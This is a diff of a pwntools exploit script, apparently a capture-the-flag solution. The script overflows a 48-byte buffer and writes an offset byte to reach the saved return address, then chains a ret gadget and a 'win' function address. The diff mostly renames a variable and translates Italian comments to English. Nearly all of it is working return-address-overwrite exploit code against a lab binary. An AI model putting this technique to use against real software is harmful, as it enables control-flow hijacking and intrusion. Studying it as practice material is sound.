@@ -18,29 +18,16 @@ win_addr = 0x401262
 ret_gadget = 0x40101a
 
 BUF_SIZE = 48
-rip_value = 0x47 # 71 bytes from the start of the buffer to the RIP. 72 breaks everything
+rip_offset = 0x47 # 71 bytes from the start of the buffer to the RIP. 72 breaks everything
 
 p.recvuntil(b'):')
 
 
 payload = b"A" * 48
-
-# 2. Salta al RIP
-payload += p8(rip_value)
-# 3. Scrivi ESATTAMENTE 8 byte per il gadget e 8 per win
-# Usiamo p64 che garantisce 8 byte ciascuno
+payload += p8(rip_offset) # we want to jump at the RIP position. 
 payload += p64(ret_gadget)
 payload += p64(win_addr)
-#payload += b"BCDEFGHILMNOPQ" # Una stringa lunga e riconoscibile
-# 4. Esci dal loop
-payload += p8(0xff)
-#payload = b'A' * BUF_SIZE
-#payload += p8(rip_value)
-
-#payload += p64(ret_gadget)
-#payload += p64(win_addr)
-
-#payload += p8(0xff)
+payload += p8(0xff) # to exit the loop
 
 #gdb.attach(p, '''
 # Break alla fine di vuln, prima del ritorno
